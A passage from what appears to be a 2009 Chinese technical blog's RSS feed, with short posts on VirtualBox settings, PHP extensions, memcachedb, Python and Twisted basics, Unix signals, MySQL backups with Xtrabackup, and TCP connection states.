VBoxManage modifyvm 编辑指定的虚拟机的配置 [-name ] 修改虚拟机的名称 [-ostype ]修改虚拟机的操作系统类型 [-memory ] 修改虚拟机的内存大小 [-vram ] 修改虚拟机的显存大小 [-acpi on|off] 启动或禁止acpi电源管理接口 [-ioapic on|off] 启动或禁止I/O APIC电源管理接口 [-pae on|off] 启动或禁止CPU的PAE支持，PAE是 Physical Address Extension : 物理地址扩展 [-hwvirtex on|off|default]启动或禁止CPU的硬件虚拟化支持 [-nestedpaging on|off] 开启或关闭CPU的嵌套页面列表支持 [-monitorcount ] 设置显示器数目，VRDP多用户模式时 [-bioslogofadein on|off] 开启或关闭bioslogo渐显效果 [-bioslogofadeout on|off] 开启或关闭bioslogo渐隐效果 [-bioslogodisplaytime ]设置bioslogo显示时间（以毫秒为单位) [-bioslogoimagepath ]设置bioslogo图像路径，用于自定义bioslogo [-biosbootmenu disabled| 设置是否显示bios启动菜单 关闭 menuonly| 只菜单 messageandmenu] 信息和菜单 [-biossystemtimeoffset ] 设置bios系统时间补偿（以毫秒为单位） [-biospxedebug on|off] 打开或关闭biospxe调试 [-boot&amp;lt;1-4&amp;gt; none|floppy|dvd|disk|net&amp;gt;] 设置启动顺序 [-hd none||] 为虚拟机添加三个IDE设备之一（第2个主盘被vm保留作为光驱，不能占用）在三个IDE中，你可以指定（硬盘）的vdi文件名或者它的UUID [-idecontroller PIIX3|PIIX4] 设置IDE控制器的类型 [-sata on|off] 开启或关闭SATA硬盘控制器 [-sataportcount &amp;lt;1-30&amp;gt;] 设置虚拟机最多支持的SATA控制器数目 [-sataport&amp;lt;1-30&amp;gt; none| 没有硬盘连接到SATA控制器 | 指定uuid的硬盘连接到SATA控制器 ] 指定文件名的硬盘连接到SATA控制器 [-sataideemulation&amp;lt;1-4&amp;gt; &amp;lt;1-30&amp;gt;] 指定一个SATA设备工作在IDE兼容模式，IDE设备编号是1-4，SATA设备编号是1-30 [-dvd none| 不连接DVD光驱 | 指定UUID的DVD光驱连接 | 将指定的光盘映像文件挂接到DVD光驱 host:] 将宿主机的DVD光驱挂接到虚拟机的DVD光驱 [-dvdpassthrough on|off]打开|关闭虚拟机里光盘的刻录功能 [-floppy disabled| 不连接软驱 empty| 连接软驱但不插入软盘 | 指定UUID的软驱连接 | 将指定的软盘映像文件挂接到软驱驱 host:] 将宿主机的软驱驱挂接到虚拟机的软驱 [-nic&amp;lt;1-N&amp;gt; none| 虚拟机不添加网卡 null| 虚拟机有网卡但不连接 nat| 网络连接使用NAT模式 hostif| 网络连接使用桥接模式 intnet] 网络连接使用内部网络模式 [-nictype&amp;lt;1-N&amp;gt; Am79C970A| 虚拟机连接AMD PCNet PCI II网卡 Am79C973| 虚拟机连接AMD PCNet FAST III网卡（默认） 82540EM| 虚拟机连接Intel PRO/1000 MT Desktop网卡 82543GC] 虚拟机连接Intel PRO/1000 T Server网卡 [-cableconnected&amp;lt;1-N&amp;gt; on|off]插入或拔出网线 [-nictrace&amp;lt;1-N&amp;gt; on|off] 开启或关闭网络追踪 [-nictracefile&amp;lt;1-N&amp;gt; ] 将网络流量追踪数据保存到文件 [-nicspeed&amp;lt;1-N&amp;gt; ] 设置网络连接的速度 [-hostifdev&amp;lt;1-N&amp;gt; none| 不连接到主机网络接口 ] 桥接模式下连接到指定的主机接口 [-intnet&amp;lt;1-N&amp;gt; ] 内网模式下为虚拟机指定内部网络名称 [-natnet&amp;lt;1-N&amp;gt; | 配置NAT网络接口的地址 default] 默认NAT网络接口的地址是10.</description>
    </item>
    
    <item>
      <title>php tokyo_tyrant扩展安装</title>
      <link>http://example.org/2009/12/12/php-tokyo_tyrante689a9e5b195e5ae89e8a385/</link>
      <pubDate>Sat, 12 Dec 2009 01:29:34 +0000</pubDate>
      
      <guid>http://example.org/2009/12/12/php-tokyo_tyrante689a9e5b195e5ae89e8a385/</guid>
      <description>tokyo_tyrant 还是beta 版，freebsd 的 ports 还没有，有点不爽，用 pecl 安装吧，
pecl install tokyo_tyrant pecl: Command not found. 先安装 pear 呵呵
cd /usr/ports/devel/pear make install clean pecl install tokyo_tyrant Failed to download pecl/tokyo_tyrant within preferred state &amp;quot;stable&amp;quot;, latest release is version 0.1.2, stability &amp;quot;beta&amp;quot;, use &amp;quot;channel://pecl.php.net/tokyo_tyrant-0.1.2&amp;quot; to install install failed 还是不行，要加入beta 才行哦
pecl install tokyo_tyrant-beta ee /usr/local/etc/php/extensions.ini 加入 extension=tokyo_tyrant.so OK 安装完成 重起php进程，用phpinfo 查看一下 freebsd 真是太强大了，喜欢哦!</description>
    </item>
    
    <item>
      <title>用pngencoder php(AMFPHP) 保存图片</title>
      <link>http://example.org/2009/12/10/e794a8pngencoder-phpamfphp-e4bf9de5ad98e59bbee78987/</link>
      <pubDate>Thu, 10 Dec 2009 02:01:35 +0000</pubDate>
      
      <guid>http://example.org/2009/12/10/e794a8pngencoder-phpamfphp-e4bf9de5ad98e59bbee78987/</guid>
      <description>转自:http://hi.baidu.com/harry1299/blog/item/d7a64e323ec976f01b4cff3a.html
1.Flash端,通过adobe的类包,将BitmapData数据Encoder成ByteArray .然后，通过http或者amfphp发送到服务器端。 Code:
var bd:BitmapData = new BitmapData(canvas.width,canvas.height); bd.draw(canvas); var jpgEncoder : PNGEncoder = new PNGEncoder(); var jpgBytes:ByteArray = PNGEncoder.encode(bd); 2.服务端的工作（针对amfphp而言）：接受ByteArray ，注意，php是直接支持ByteArray类型的，然后通过fwrite或者file_put_contents，写数据，并且输出文件，ok搞定 Code:
public function createSavePngFile($ba,$savePoint) { date_default_timezone_set(&#39;Asia/Shanghai&#39;); $now = date(&amp;quot;YmdHis&amp;quot;); $path = &amp;quot;resource/shareVideo/&amp;quot;; $fileName = $path.$now.&amp;quot;.png&amp;quot;; $data = $ba-&amp;gt;data; if(!file_exists($path.$now.&amp;quot;.png&amp;quot;)) { $input = file_put_contents( $fileName, $data);//写入二进制数据 if($input != 0 &amp;amp;&amp;amp; $input != -1) { return $this-&amp;gt;serverPoxy-&amp;gt;updateShareInfo($savePoint,$fileName); } else { return false; } } return false; } 注意：file_put_contents( $fileName, $data);中第二个参数是：$ba-&amp;gt;data,而不是$ba,这是php的数据结构的规范。我就是搞错了这个，浪费了大侠我整个一个上午的时间，可恶^_^.</description>
    </item>
    
    <item>
      <title>memcachedb</title>
      <link>http://example.org/2009/12/07/memcachedb/</link>
      <pubDate>Mon, 07 Dec 2009 16:11:16 +0000</pubDate>
      
      <guid>http://example.org/2009/12/07/memcachedb/</guid>
      <description>memcachedb是为了持久化而产生的一个分布式 &amp;ldquo;key-value&amp;quot;存储系统，你可以认为是memcached+berkeley DB+sina的一些东西的一个集成，这个东西主要是为了提高持久化对象的访问效率，而不是一个缓存，他的特点是：
比传统的RDBMS速度快效率高 高并发环境下访问安全可靠，效率很不错 存储的数据比较小 总之：高效、安全的事物机制、memcached的分布式协议支持 是他的几大亮点.
你可以将一些数据量不大，读写却很频繁的数据放再这里面，而不用往mysql等数据库里写，据说“sohu”的在线用户是存在这里面的，可见这东西还是挺可靠的。 在官方文档里明确指出，只提倡用此数据库保存如下类型的数据：
Index, Counter, Flags Identity Management(Account, Profile, User config info, Score) Messaging Personal domain name meta data of distributed system Other non-relatonal data &amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;..
即，要求访问数据快、数据量不大，并且需要持久化到数据库中，却不需要sql查询的数据.
下面我们来说应用： 如果你看过了上一片文章，并且已经成功安装memcachedb的话，那么，现在请启动你的memcachedb,命令如下： memcachedb -p21201 -d -r -u root -f 21201.db -H /data1/demo -N -P /data1/logs/21201.pid 参数说明如下：
‘-p ’ TCP port number to listen on (default: 21201) tcp侦听端口
‘-l ’ interface to listen on, default is INDRR ANY 这个不要管他</description>
    </item>
    
    <item>
      <title>freebsd下python程序打包工具 ── cx_Freeze</title>
      <link>http://example.org/2009/12/04/freebsde4b88bpythone7a88be5ba8fe68993e58c85e5b7a5e585b7-e29480e29480-cx_freeze/</link>
      <pubDate>Fri, 04 Dec 2009 15:38:35 +0000</pubDate>
      
      <guid>http://example.org/2009/12/04/freebsde4b88bpythone7a88be5ba8fe68993e58c85e5b7a5e585b7-e29480e29480-cx_freeze/</guid>
      <description>cx_Freeze是一个类似py2exe的工具，它们区别是py2exe是将python程序打包成windows下可以执行的exe文件的，而cx_Freeze则是将python程序打包为linux下可以直接执行的ELF格式的二进制可执行文件（看说明好像也能生成windows的可执行文件，号称跨平台）。 cx_Freeze的作用就是让你的python程序可以脱离python运行环境，在没有安装python的微型linux系统（例如cdlinux、tinycore等）里，方便地运行你的python程序。从功能上来说，也可以将其理解为一个python程序的编译器，将你的源码隐藏起来。
安装
cd /usr/ports/devel/cx_Freeze make install clean 打包程序
cxfreeze 你的程序文件.py --target-dir dist </description>
    </item>
    
    <item>
      <title>Python date测试</title>
      <link>http://example.org/2009/12/04/python-datee6b58be8af95/</link>
      <pubDate>Fri, 04 Dec 2009 14:18:54 +0000</pubDate>
      
      <guid>http://example.org/2009/12/04/python-datee6b58be8af95/</guid>
      <description>import datetime, calendar
today = datetime.date.today() oneday = datetime.timedelta(days=1) # loop back to most recent Friday (could be today) # takes care of end of month and even leap years friday = today while friday.weekday() != calendar.FRIDAY: friday -=oneday oneweek = datetime.timedelta(days=7) nextweek = today + oneweek nextyear = today.replace(year=today.year+1) print &amp;quot;Today (year-month-day) = &amp;quot;, today print &amp;quot;Most recent Friday = &amp;quot;, friday print &amp;quot;One week from today = &amp;quot;, nextweek print &amp;quot;One year from today = &amp;quot;, nextyear print &amp;quot;Current time = &amp;quot;, datetime.</description>
    </item>
    
    <item>
      <title>當Deferred遇上Thread</title>
      <link>http://example.org/2009/12/04/e795b6deferrede98187e4b88athread/</link>
      <pubDate>Fri, 04 Dec 2009 05:32:46 +0000</pubDate>
      
      <guid>http://example.org/2009/12/04/e795b6deferrede98187e4b88athread/</guid>
      <description>當Deferred遇上Thread Deferred不會自動實現將阻塞過程轉為非阻塞過程，雖然它已經有那樣的機制但還是要你去多走一步。要將阻塞過程轉為真正的非阻塞過程，那　只有借用線程。但至於線程調用你不用太擔心，twisted已為你準備好一個方便的用法。就是將Deferred綁在Thread上，這樣就有了deferToThread，味道不比牛奶加巧克力差。 deferToThread在twisted文檔的說明，洋墨水喝得比較少，就不照字面翻譯了。大概意思是將函數f放在線程裡並作為Deferred返回，args和kwargs是函數f的參數。也就是使用deferToThread返回的是一個帶線程的Deferred，並自動使用callback調用指定的函數f。相當於在線程中運行下面的代碼 d=defer.Deferred().addCallback(f) d.callback(result)
def deferToThread(f, *args, **kwargs): (source) Run a function in a thread and return the result as a Deferred. Parameters f The function to call.
*args positional arguments to pass to f.
**kwargs keyword arguments to pass to f.
Returns A Deferred which fires a callback with the result of f, or an errback with a twisted.python.failure.Failure if f throws an exception.
#!/usr/bin/env python #coding=utf-8 from twisted.</description>
    </item>
    
    <item>
      <title>Deferred筆記一</title>
      <link>http://example.org/2009/12/04/deferrede7ad86e8a898e4b880/</link>
      <pubDate>Fri, 04 Dec 2009 05:19:29 +0000</pubDate>
      
      <guid>http://example.org/2009/12/04/deferrede7ad86e8a898e4b880/</guid>
      <description>Deferred的簡單套路
從twisted的文檔入手，將Deferred獨立出來簡單的說明作用與使用方法，這樣更能快速對Deferred有深刻的了解。
一、學習資料 1、主要參考資料 官方文檔 http://twistedmatrix.com/projects/core/documentation/howto/deferredindepth.html 關聯譯文 http://wiki.woodpecker.org.cn/moin/twistedTUT00?action=AttachFile&amp;amp;do;=get&amp;amp;target;=deferred_tutorial.html（此鏈接將會下載離線文檔）
2、關聯資源 http://wiki.woodpecker.org.cn/moin/TwistedTUT
二、Deferred的作用 Deferred的主要作用可以用一句話比較形象說明，“不要打電話給我,我會打給你的(Don&amp;rsquo;t Call Us, We&amp;rsquo;ll Call You)”。相當於做好計劃後，執行交給Deferred，完成後再找我，我可要到一邊Happy去了。 它會根據callback運行結果（正常、發生例外）從callback鏈表中選擇執行已註冊的相應的callback函數，從而實現事件方式來驅動程序。 callback的運行不影響主程序的運行，Deferred.callback執行後馬上返回。(這點有待在後面證明)
三、Deferred實例 from twisted.internet import defer d=defer.Deferred() 實例化後就可以對Deferred進行操作。
四、callback鏈表 鏈表是用來放置callback函數，鏈表中的函數可以響應三類事件，正常結束、例外結束、任意（包括前面兩者），它們分別用addCallback、addErrback、addBoth註冊到鏈表中。也就是說函數正常結束返回調用addCallback註冊的函數，發生例外則調用addErrback註冊的函數，使用addBoth註冊的函數無論返回什　結果都會被調用。
五、callback函數註冊 除了上面提過的addCallback、addErrback、addBoth三個註冊函數外，還有另外一個addCallbacks可以同時註冊處理正常結束和例外結束的函數。
1 2 3 4 5 6 def deferredExample(): d = defer.Deferred() d.addCallback(failAtHandlingResult) d.addCallbacks(yesDecision, noDecisionPassthru) d.addCallback(handleResult) # - A - d.addErrback(handleFailure)
上面代碼中第4行的addCallbacks效果如同 d.addCallback(yesDecision) d.addErrback(noDecisionPassthru)
另外，我們也可以將註冊過程寫成下面形式。 d=refer.Deferred().addCallback(failAtHandlingResult).addCallbacks(yesDecision, noDecisionPassthru).addCallback(handleResult).addErrback(handleFailure)
六、callback鏈執行順序 Deferred的鏈表是按順序從第一個註冊函數開始直到最後一個函數。如果發生例外時，有多個例外處理函數，則會調用發生例外函數下面第一個例外處理函數。後面的例外處理函數將不會被調用，除非第一個例外處理函數將這個例外向下傳遞。
七、其它一些特性 Deferred實例中還有另外一些函數，如pause,unpause,setTimeout,timeoutCall,chainDeferred，這些將留作下一步的測試。 另外還沒涉及到的是Deferred上一級的defer庫中的函數及其它類的使用，從一些代碼看來這些函數將會進一步有利於Deferred的應用，但這也有待後面的進上步學習。
八、總結 經過Deferred are beautiful一節學習，了解Deferred的使用方法及其事件響應機制。
創建於2009年8月31日
原文 http://sites.google.com/site/mypynotes/twisted-1/deferred 可以被gw了</description>
    </item>
    
    <item>
      <title>Python 语法运用</title>
      <link>http://example.org/2009/12/03/python-e8afade6b395e8bf90e794a8/</link>
      <pubDate>Thu, 03 Dec 2009 09:04:07 +0000</pubDate>
      
      <guid>http://example.org/2009/12/03/python-e8afade6b395e8bf90e794a8/</guid>
      <description>u=[&amp;ldquo;a&amp;rdquo;,&amp;ldquo;b&amp;rdquo;,&amp;ldquo;c&amp;rdquo;] l = [&amp;ldquo;name=%s&amp;rdquo; % user for user in u ]
结果: [&amp;ldquo;name=a&amp;rdquo;, &amp;ldquo;name=b&amp;rdquo;,&amp;ldquo;name=c&amp;rdquo;]
l ={&amp;ldquo;a&amp;rdquo;:1,&amp;ldquo;b&amp;rdquo;:2,&amp;ldquo;c&amp;rdquo;:3} [k for k,v in l.items()] 结果: [&amp;ldquo;a&amp;rdquo;,&amp;ldquo;b&amp;rdquo;,&amp;ldquo;c&amp;rdquo;]
l ={&amp;ldquo;a&amp;rdquo;:1,&amp;ldquo;b&amp;rdquo;:2,&amp;ldquo;c&amp;rdquo;:3} [&amp;quot;%s=%s&amp;quot; % (k,v) for k,v in l.items()] [&amp;ldquo;a=1&amp;rdquo;,&amp;ldquo;b=2&amp;rdquo;,&amp;ldquo;c=3&amp;rdquo;]
2.lambda lambda 是预代理,代替要生成方法的指针,我这样理解的
d.addCallback(lambda m: &amp;quot;status of %s : %s&amp;quot; % (msg,m)) d.addCallback(lambda m: self.msg(user,m)) 3.文件的操作 这是方指的是txt文件操作
注意路径只能是 / 的方式处理, 打开的模式,你可以采用 help(file)的方式来查. f = file(&amp;ldquo;c:/tmp/abc.txt&amp;rdquo;,&amp;ldquo;r&amp;rdquo;) for line in f: user,status = line.split(&amp;quot;:&amp;quot;,1) user = user.strip() status = status.</description>
    </item>
    
    <item>
      <title>python的dict,set,list,tuple应用</title>
      <link>http://example.org/2009/12/03/pythone79a84dictsetlisttuplee5ba94e794a8/</link>
      <pubDate>Thu, 03 Dec 2009 09:00:29 +0000</pubDate>
      
      <guid>http://example.org/2009/12/03/pythone79a84dictsetlisttuplee5ba94e794a8/</guid>
      <description>字典(dict) dict 用 {} 包围 dict.keys(),dict.values(),dict.items() hash(obj)返回obj的哈希值，如果返回表示可以作为dict的key del 或 dict.pop可以删除一个item,clear清除所有的内容 sorted(dict)可以吧dict排序 dict.get()可以查找没存在的key，dict.[]不可以 dict.setdefault() 检查字典中是否含有某键。 如果字典中这个键存在，你可以取到它的值。 如果所找的键在字典中不存在，你可以给这个键赋默认值并返回此值。 {}.fromkeys()创建一个dict，例如: {}.fromkeys((&amp;rsquo;love&amp;rsquo;, &amp;lsquo;honor&amp;rsquo;), True) =&amp;gt;{&amp;rsquo;love&amp;rsquo;: True, &amp;lsquo;honor&amp;rsquo;: True} 不允许一个键对应多个值 键值必须是哈希的，用hash()测试 一个对象，如果实现_hash()_方法可以作为键值使用 集合(set) 集合是一个数学概念，用set()创建 set.add(),set.update.set.remove，添加更新删除，-= 可以做set减法 set.discard 和 set.remove不同在于如果删除的元素不在集合内，discard不报错，remove 报错 &amp;lt; &amp;lt;= 表示 子集，&amp;gt; &amp;gt;=表示超集 | 表示联合 &amp;amp; 表示交集 - 表示差集 ^ 差分集里啊 列表(list) 列表是序列对象，可包含任意的Python数据信息，如字符串、数字、列表、元组等。列表的数据是可变的，我们可通过对象方法对列表中的数据进行增加、修改、删除等操作。可以通过list(seq)函数把一个序列类型转换成一个列表。 append(x) 在列表尾部追加单个对象x。使用多个参数会引起异常。 count(x) 返回对象x在列表中出现的次数。 extend(L) 将列表L中的表项添加到列表中。返回None。 Index(x) 返回列表中匹配对象x的第一个列表项的索引。无匹配元素时产生异常。 insert(i,x) 在索引为i的元素前插入对象x。如list.insert(0,x)在第一项前插入对象。返回None。 pop(x) 删除列表中索引为x的表项，并返回该表项的值。若未指定索引，pop返回列表最后一项。 remove(x) 删除列表中匹配对象x的第一个元素。匹配元素时产生异常。返回None。 reverse() 颠倒列表元素的顺序。 sort() 对列表排序，返回none。bisect模块可用于排序列表项的添加和删除。 元组(tuple) tuple=(1,)，这是单个元素的元组表示，需加额外的逗号。 tuple=1，2，3，4，这也可以是一个元组，在不使用圆括号而不会导致混淆时，Python允许不使用圆括号的元组。 和列表一样，可对元组进行索引、分片、连接和重复。也可用len()求元组长度。</description>
    </item>
    
    <item>
      <title>Deferred Object In Twisted</title>
      <link>http://example.org/2009/12/03/deferred-object-in-twisted/</link>
      <pubDate>Thu, 03 Dec 2009 04:57:12 +0000</pubDate>
      
      <guid>http://example.org/2009/12/03/deferred-object-in-twisted/</guid>
      <description>Twisted uses the Deferred object to manage the callback sequence. The client application attaches a series of functions to the deferred to be called in order when the results of the asychronous request are available(this series of functions is known as a series of callbacks, or a callback chain), together with a series of functions to be called if there is an error in the asychronous request(known as a series of errbacks or an errback chain).</description>
    </item>
    
    <item>
      <title>Python 类型</title>
      <link>http://example.org/2009/12/03/python-e7b1bbe59e8b/</link>
      <pubDate>Thu, 03 Dec 2009 04:53:54 +0000</pubDate>
      
      <guid>http://example.org/2009/12/03/python-e7b1bbe59e8b/</guid>
      <description>1.Dictionry {} 相录于一个 key value的内容
mys={&amp;ldquo;a&amp;rdquo;:1,&amp;ldquo;b&amp;rdquo;:2,&amp;ldquo;c&amp;rdquo;:3} mys[&amp;ldquo;a&amp;rdquo;] = 1 mys.keys() mys.values()
for k,v in mys.items(): print k,v
2.List 是一个列表 [] mys=[&amp;ldquo;a&amp;rdquo;,&amp;ldquo;b&amp;rdquo;,1] mys[0] mys[1] mys[-1]
for v in mys: print v;
Tuple 一个不能改变的list （） mys=(1,2,&amp;ldquo;a&amp;rdquo;) mys[0] mys[1]
for v in mys: print v;
这三种类型可以完全结合 mys=[(2,3),(4,5),(&amp;ldquo;a&amp;rdquo;,&amp;ldquo;b&amp;rdquo;)] mys={&amp;ldquo;a&amp;rdquo;:[2,3,4],&amp;ldquo;b&amp;rdquo;:[3,4,5]} mys[&amp;ldquo;a&amp;rdquo;].pop() 可以这样的写。</description>
    </item>
    
    <item>
      <title>进程信号</title>
      <link>http://example.org/2009/11/30/e8bf9be7a88be4bfa1e58fb7/</link>
      <pubDate>Mon, 30 Nov 2009 01:50:25 +0000</pubDate>
      
      <guid>http://example.org/2009/11/30/e8bf9be7a88be4bfa1e58fb7/</guid>
      <description>转载：http://blog.csdn.net/ljx0305/archive/2008/09/09/2904056.aspx
SIGHUP 终止进程 终端线路挂断 SIGINT 终止进程 中断进程 SIGQUIT 建立CORE文件终止进程，并且生成core文件 SIGILL 建立CORE文件 非法指令 SIGTRAP 建立CORE文件 跟踪自陷 SIGBUS 建立CORE文件 总线错误 SIGSEGV 建立CORE文件 段非法错误 SIGFPE 建立CORE文件 浮点异常 SIGIOT 建立CORE文件 执行I/O自陷 SIGKILL 终止进程 杀死进程 SIGPIPE 终止进程 向一个没有读进程的管道写数据 SIGALARM 终止进程 计时器到时 SIGTERM 终止进程 软件终止信号 SIGSTOP 停止进程 非终端来的停止信号 SIGTSTP 停止进程 终端来的停止信号 SIGCONT 忽略信号 继续执行一个停止的进程 SIGURG 忽略信号 I/O紧急信号 SIGIO 忽略信号 描述符上可以进行I/O SIGCHLD 忽略信号 当子进程停止或退出时通知父进程 SIGTTOU 停止进程 后台进程写终端 SIGTTIN 停止进程 后台进程读终端 SIGXGPU 终止进程 CPU时限超时 SIGXFSZ 终止进程 文件长度过长 SIGWINCH 忽略信号 窗口大小发生变化 SIGPROF 终止进程 统计分布图用计时器到时 SIGUSR1 终止进程 用户定义信号1 SIGUSR2 终止进程 用户定义信号2 SIGVTALRM 终止进程 虚拟计时器到时</description>
    </item>
    
    <item>
      <title>用Python写简单守护进程【转】</title>
      <link>http://example.org/2009/11/28/e794a8pythone58699e7ae80e58d95e5ae88e68aa4e8bf9be7a88be38090e8bdace38091/</link>
      <pubDate>Sat, 28 Nov 2009 08:39:42 +0000</pubDate>
      
      <guid>http://example.org/2009/11/28/e794a8pythone58699e7ae80e58d95e5ae88e68aa4e8bf9be7a88be38090e8bdace38091/</guid>
      <description>[转载自]http://www.jejik.com/articles/2007/02/a_simple_unix_linux_daemon_in_python/
I&amp;rsquo;ve written a simple Python class for creating daemons on unix/linux systems. It was pieced together for various other examples, mostly corrections to various Python Cookbook articles and a couple of examples posted to the Python mailing lists. It has support for a pidfile to keep track of the process. I hope it&amp;rsquo;s useful to someone.
Below is the Daemon class. To use it, simply subclass it and implement the run() method.</description>
    </item>
    
    <item>
      <title>Django and Memcached</title>
      <link>http://example.org/2009/11/28/django-and-memcached/</link>
      <pubDate>Sat, 28 Nov 2009 03:50:34 +0000</pubDate>
      
      <guid>http://example.org/2009/11/28/django-and-memcached/</guid>
      <description>just ran into several problems while setting up memcached for a django installation, that is replicated over several servers. One of the problems was the compiling of cmemcache, a python extension for libmemcache, where I received the following error:
‘CmemcacheObject’ has no member named ‘mc_ctxt’
First I didn’t realized the additional file, that resides at the file list of downloadable cmemcache versions. With this file you can patch the libmemcache library so cmemcache can be build.</description>
    </item>
    
    <item>
      <title>Xtrabackup备份和恢复MySQL</title>
      <link>http://example.org/2009/11/24/xtrabackup-backup-recover-mysql/</link>
      <pubDate>Tue, 24 Nov 2009 05:21:29 +0000</pubDate>
      
      <guid>http://example.org/2009/11/24/xtrabackup-backup-recover-mysql/</guid>
      <description>Xtrabackup是一个对InnoDB做数据备份的工具，支持在线热备份（备份时不影响数据读写），是商业备份工具InnoDB Hotbackup的一个很好的替代品。Xtrabackup中包含两个工具：
* xtrabackup - 用于热备份innodb, xtradb表的工具，不能备份其他表。 * innobackupex - 对xtrabackup封装的perl脚本，提供了myisam表备份的能力。 Xtrabackup可以做什么
* 在线(热)备份整个库的InnoDB, XtraDB表 * 在xtrabackup的上一次整库备份基础上做增量备份（innodb only） * 以流的形式产生备份，可以直接保存到远程机器上（本机硬盘空间不足时很有用） Xtrabackup如何工作的
* xtrabackup - 具体原理有待研究。。。 * innobackupex整库备份 1. 调用xtrabackup对innodb表空间文件（这一瞬间的映像Time1）备份，而在这个innodb表备份期间数据库是不加锁的，外部可以继续往库里增减数据（这才能叫热备份）。而在Time1和Time2这两个时间点之间的改动由一个线程不断地扫innodb log获得(ChangeSet1)。 2. 锁所有库。 3. 以直接拷贝的方式备份frm,MYD,MYI,MRG,TRG,TRN,opt格式的文件。 4. 步骤3中的数据备份完毕时(Time2)，停止扫innodb log的线程，把ChangeSet1的数据拷贝到备份中。 5. 解锁所有库。 6. 终止挂起，备份完毕。 注意要点
* 根据innobackupex的原理可知它不是真正的热备份，MyISAM表越少越小就越有利。要利用Xtrabackup的好处就尽量用innodb表。 * 还原备份前关闭mysql服务；还原备份后检查数据文件权限是否正确。 * 性能：备份一个数据目录总大小5.6G，其中ibdata 2G，总时间4分钟，锁表时间2.5分钟。如果用mysqldump做这个库的备份锁表时间是5-8倍。 安装
tar zxf xtrabackup-0.7.tar.gz cd xtrabackup-0.7 ./configure make 进行到这里时，千万别惯性使用make install，那样就会接着安装MySQL了，正确方法是接着：
cd innobase/xtrabackup/ make make install 然后，就会在你的/usr/bin目录里安装上两个工具：xtrabackup，innobackupex-1.5.1
制定备份多个数据库 innobackupex-1.5.1 --user=root --databases=&amp;quot;innodb innodb2&amp;quot; /bak/ 压缩备份（不加&amp;ndash;databases，默认全部数据库） innobackupex-1.</description>
    </item>
    
    <item>
      <title>TCP连接状态</title>
      <link>http://example.org/2009/11/22/tcpe8bf9ee68ea5e78ab6e68081/</link>
      <pubDate>Sun, 22 Nov 2009 09:48:51 +0000</pubDate>
      
      <guid>http://example.org/2009/11/22/tcpe8bf9ee68ea5e78ab6e68081/</guid>
      <description>CLOSED: 表示初始状态。
LISTEN: 表示服务器端的某个SOCKET处于监听状态，可以接受连接。
SYN_SENT:在服务端监听后，客户端SOCKET执行CONNECT连接时，客户端发送SYN报文，此时客户端就进入SYN_SENT状态，等待服务端的确认
SYN_RCVD: 表示服务端接受到了SYN报文，在正常情况下，这个状态是服务器端的SOCKET在建立TCP连接时的三次握手会话过程中的一个中间状态，很短暂，基本上用netstat你是很难看到这种状态的，除非你特意写了一个客户端测试程序，故意将三次TCP握手过程中最后一个ACK报文不予发送。因此这种状态时，当收到客户端的ACK报文后，它会进入到ESTABLISHED状态。
ESTABLISHED：表示连接已经建立了。
FIN_WAIT_1: 这个是已经建立连接之后，其中一方请求终止连接，等待对方的FIN报文。FIN_WAIT_1状态是当SOCKET在ESTABLISHED状态时，它想主动关闭连接，向对方发送了FIN报文，此时该SOCKET即进入到FIN_WAIT_1状态。而当对方回应ACK报文后，则进入到FIN_WAIT_2状态，当然在实际的正常情况下，无论对方何种情况下，都应该马上回应ACK报文，所以FIN_WAIT_1状态一般是比较难见到的，而FIN_WAIT_2状态还有时常常可以用netstat看到。
FIN_WAIT_2：实际上FIN_WAIT_2状态下的SOCKET，表示半连接，也即有一方要求close连接，但另外还告诉对方，我暂时还有点数据需要传送给你，稍后再关闭连接。
TIME_WAIT: 表示收到了对方的FIN报文，并发送出了ACK报文，就等2MSL后即可回到CLOSED可用状态了。如果FIN_WAIT_1状态下，收到了对方同时带FIN标志和ACK标志的报文时，可以直接进入到TIME_WAIT状态，而无须经过FIN_WAIT_2状态。
CLOSING: 这种状态比较特殊，实际情况中应该是很少见，属于一种比较罕见的例外状态。正常情况下，当你发送FIN报文后，按理来说是应该先收到(或同时收到)对方的ACK报文，再收到对方的FIN报文。但是CLOSING状态表示你发送FIN报文后，并没有收到对方的ACK报文，反而却也收到了对方的FIN报文。什么情况下会出现此种情况呢？其实细想一下，也不难得出结论：那就是如果双方几乎在同时close一个SOCKET的话，那么就出现了双方同时发送FIN报文的情况，也即会出现CLOSING状态，表示双方都正在关闭SOCKET连接。
CLOSE_WAIT: 这种状态的含义其实是表示在等待关闭。怎么理解呢？当对方close一个SOCKET后发送FIN报文给自己，你系统毫无疑问地会回应一个ACK报文给对方，此时则进入到CLOSE_WAIT状态。接下来呢，实际上你真正需要考虑的事情是察看你是否还有数据发送给对方，如果没有的话，那么你也就可以close这个SOCKET，发送FIN报文给对方，也即关闭连接。所以你在CLOSE_WAIT状态下，需要完成的事情是等待你去关闭连接。
LAST_ACK: 这个状态还是比较容易好理解的，它是被动关闭一方在发送FIN报文后，最后等待对方的ACK报文。当收到ACK报文后，也即可以进入到CLOSED可用状态了。</description>
    </item>
    
    <item>
      <title>windows下开发并编译PHP扩展(步骤说明)</title>
      <link>http://example.org/2009/11/02/windowse4b88be5bc80e58f91e5b9b6e7bc96e8af91phpe689a9e5b195e6ada5e9aaa4e8afb4e6988e/</link>
      <pubDate>Mon, 02 Nov 2009 06:40:08 +0000</pubDate>
      
      <guid>http://example.org/2009/11/02/windowse4b88be5bc80e58f91e5b9b6e7bc96e8af91phpe689a9e5b195e6ada5e9aaa4e8afb4e6988e/</guid>
      <description>开发PHP扩展对于普通程序员来讲可能一直是一件很神秘的工作，其实，只要你对C语言熟悉，了解了开发PHP扩展的步骤和规则，开发PHP扩展也是一件很普通的工作。 现在就简单说一在WINDOWS下开发PHP扩展的步骤： 首先需要准备的软件有： cygwin 安装路径e:\app\cygwin visual studio C++ 6.0, 修改环境变量，把已经安装好的PHP路径设置为环境变量。在这里，假设我的PHP安装目录是：e:\app\php5.2.5,那么我把WINDOWS环境变量后面加上这个安装目录。方便一会儿使用php.exe。 PHP源代码，这里假设为e:\c_source_code\php-5.2.5
